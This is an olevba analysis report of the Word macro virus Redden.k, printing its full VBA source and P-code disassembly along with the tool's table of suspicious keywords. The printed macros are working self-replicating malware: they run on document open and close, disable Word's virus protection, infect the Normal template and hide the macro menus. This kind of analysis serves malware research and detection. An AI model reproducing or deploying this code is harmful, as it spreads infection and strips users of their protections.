olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()
'I is not spiteful macros :) ! I feed system(ini) 8(
On Error GoTo Phuck
VSav = ActiveDocument.Saved
Options.VirusProtection = False
Options.SaveNormalPrompt = False
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
SR = SR & "\system.ini"
Open SR For Append As #1
Randomize
How = Int(128 * Rnd)
For i = 0 To How
Next i
Close #1
If ThisDocument.FullName = NormalTemplate.FullName Then
    Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
    Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
    Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
    Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
    For j = 1 To cou
        dest.CodeModule.DeleteLines (1)
    Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    aprj = NormalTemplate.VBProject.VBComponents(i).Name
    If aprj = "HungrySYS" Then already = True
Next i
If Not already Then
        NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
        NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "HungrySYS"
        Set nor = NormalTemplate.VBProject.VBComponents("HungrySYS").CodeModule
        eol = Chr(13) + Chr(10)
        nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
        nor.AddFromString ("Sub Organizer" + eol + "End Sub")
        nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
        nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
If ((VSav = True) And (ActiveDocument.Saved = False)) Then ActiveDocument.Save
End Sub

Private Sub Document_Open()
'I is not spiteful macros :) ! I feed system(ini) 8(
On Error GoTo Phuck
VSav = ActiveDocument.Saved
Options.VirusProtection = False
Options.SaveNormalPrompt = False
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
SR = SR & "\system.ini"
Open SR For Append As #1
Randomize
How = Int(128 * Rnd)
For i = 0 To How
Next i
Close #1
If ThisDocument.FullName = NormalTemplate.FullName Then
    Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
    Set stlth = ActiveDocument.VBProject
    Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
    Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
    Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
    Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
    For j = 1 To cou
        dest.CodeModule.DeleteLines (1)
    Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
    For i = 1 To cnt
        aprj = stlth.VBComponents(i).Name
    If aprj = "HungrySYS" Then already = True
    Next i
Else
    already = False
End If
If Not already Then
    stlth.VBComponents.Add (vbext_ct_StdModule)
    stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "HungrySYS"
Set nor = stlth.VBComponents("HungrySYS").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
If ((VSav = True) And (ActiveDocument.Saved = False)) Then ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Redden.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6454 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' 	QuoteRem 0x0000 0x0033 "I is not spiteful macros :) ! I feed system(ini) 8("
' Line #4:
' 	OnError Phuck 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St VSav 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SR 
' Line #9:
' 	Ld SR 
' 	LitStr 0x000B "\system.ini"
' 	Concat 
' 	St SR 
' Line #10:
' 	Ld SR 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St How 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld How 
' 	For 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #18:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #21:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #24:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #26:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #27:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #30:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #31:
' 	LitVarSpecial (False)
' 	St already 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #33:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #34:
' 	Ld aprj 
' 	LitStr 0x0009 "HungrySYS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #37:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #38:
' 	LitStr 0x0009 "HungrySYS"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #39:
' 	SetStmt 
' 	LitStr 0x0009 "HungrySYS"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #40:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #41:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #42:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #43:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label Phuck 
' Line #47:
' 	Ld VSav 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub Document_Open())
' Line #51:
' 	QuoteRem 0x0000 0x0033 "I is not spiteful macros :) ! I feed system(ini) 8("
' Line #52:
' 	OnError Phuck 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St VSav 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #56:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SR 
' Line #57:
' 	Ld SR 
' 	LitStr 0x000B "\system.ini"
' 	Concat 
' 	St SR 
' Line #58:
' 	Ld SR 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #59:
' 	ArgsCall Read 0x0000 
' Line #60:
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St How 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld How 
' 	For 
' Line #62:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #64:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #65:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #66:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set stlth 
' Line #67:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #68:
' 	ElseBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #70:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #71:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set stlth 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #74:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #75:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #76:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #77:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #80:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #81:
' 	LitVarSpecial (False)
' 	St already 
' Line #82:
' 	Ld stlth 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St cnt 
' Line #83:
' 	Ld cnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cnt 
' 	For 
' Line #85:
' 	Ld i 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #86:
' 	Ld aprj 
' 	LitStr 0x0009 "HungrySYS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	LitVarSpecial (False)
' 	St already 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #92:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld stlth 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #93:
' 	LitStr 0x0009 "HungrySYS"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #94:
' 	SetStmt 
' 	LitStr 0x0009 "HungrySYS"
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #95:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #96:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #97:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #98:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #99:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Label Phuck 
' Line #102:
' 	Ld VSav 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #103:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

